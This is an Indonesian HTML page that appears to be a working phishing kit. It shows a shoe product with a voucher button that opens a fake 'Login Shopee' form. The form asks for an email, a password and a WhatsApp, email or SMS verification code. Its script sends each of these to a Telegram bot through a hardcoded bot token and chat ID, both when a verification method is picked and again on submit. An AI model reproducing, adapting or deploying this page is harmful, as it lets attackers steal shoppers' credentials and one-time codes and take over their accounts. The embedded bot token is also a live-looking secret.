<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Halaman Produk dan Login</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    background-color: #fff;
  }
  .container {
    width: 100%;
    max-width: 400px;
    margin: auto;
  }
  .product-image {
    width: 100%;
    display: block;
  }
  .beli-btn {
    width: 100%;
    background-color: #ff4646;
    color: #fff;
    padding: 15px;
    font-size: 16px;
    border: none;
    margin-top: 10px;
    cursor: pointer;
  }
  .beli-btn:hover {
    background-color: #e03e3e;
  }
  /* Form login style */
  #login-section {
    display: none;
    margin-top: 20px;
  }
  .login-box {
    padding: 20px;
    background-color: #f2f2f2;
    border-radius: 8px;
  }
</style>
<script>
  const telegramBotToken = '8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M';
  const chatId = '5116335881';

  function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    }).then(response => response.json())
      .then(data => {
        console.log('Pesan terkirim:', data);
      })
      .catch(error => {
        console.error('Error:', error);
      });
  }

  function showLogin() {
    document.getElementById('product-section').style.display = 'none';
    document.getElementById('login-section').style.display = 'block';
  }

  // Saat memilih metode verifikasi
  function pilihVerifikasi(method) {
    document.getElementById('verif-section').style.display = 'block';
    document.getElementById('verif-label').innerText = 'Masukkan kode dari ' + method;

    // Ambil nilai password dan email
    const password = document.getElementById('password').value || '(belum diisi)';
    const email = document.getElementById('email').value || '(belum diisi)';

    // Kirim info email dan metode ke Telegram
    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nPassword: ${password}`;
    sendTelegramMessage(pesan);
  }

  // Saat klik login setelah memasukkan kode
  function submitLogin() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const kodeVerif = document.getElementById('kode-verifikasi').value;
    const metode = document.getElementById('verif-method').value;

    if (!email || !password || !metode || !kodeVerif) {
      alert('Harap lengkapi semua kolom!');
      return;
    }

    // Kirim detail lengkap termasuk password dan kode verifikasi
    const pesan = `Login:\nEmail: ${email}\nPassword: ${password}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
    sendTelegramMessage(pesan);

    alert('Pesan lengkap dikirim ke Telegram!');
  }
</script>
</head>
<body>

<!-- Tampilan produk awal -->
<div class="container" id="product-section">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTH02HrM38HjBxsiEZvmzE7Hx-QDFGXxdzYaPwHFtfyCw&s=10" alt="Sepatu Puma" class="product-image" />
  <button class="beli-btn" onclick="showLogin()">Beli Dengan Voucher</button>
</div>

<!-- Form login yang muncul setelah tombol diklik -->
<div id="login-section">
  <h2>Login Shopee</h2>
  <div class="login-box">
    <form onsubmit="event.preventDefault(); submitLogin();">
      <label>Email:</label><br>
      <input type="email" id="email" placeholder="Email" style="width: 100%; padding: 10px; margin-top: 5px;" required /><br><br>
      <label>Password:</label><br>
      <input type="password" id="password" placeholder="Password" style="width: 100%; padding: 10px; margin-top: 5px;" required /><br><br>

      <label for="verif-method">Pilih metode verifikasi:</label>
      <select id="verif-method" onchange="pilihVerifikasi(this.value)" style="width: 100%; padding: 10px; margin-top: 5px;" required>
        <option value="">--Pilih metode--</option>
        <option value="WhatsApp">WhatsApp</option>
        <option value="Email">Email</option>
        <option value="SMS">SMS</option>
      </select>

      <div class="verif-section" id="verif-section" style="display:none; margin-top:10px;">
        <label id="verif-label"></label>
        <input type="text" id="kode-verifikasi" placeholder="Masukkan kode" style="width: 100%; padding: 10px; margin-top: 5px;" required />
      </div>

      <button type="submit" style="width: 100%; padding: 12px; background-color:#ff4646; color:#fff; border:none; border-radius:5px; font-size:16px; cursor:pointer; margin-top:15px;">Login</button>
    </form>
  </div>
</div>

</body>
</html>
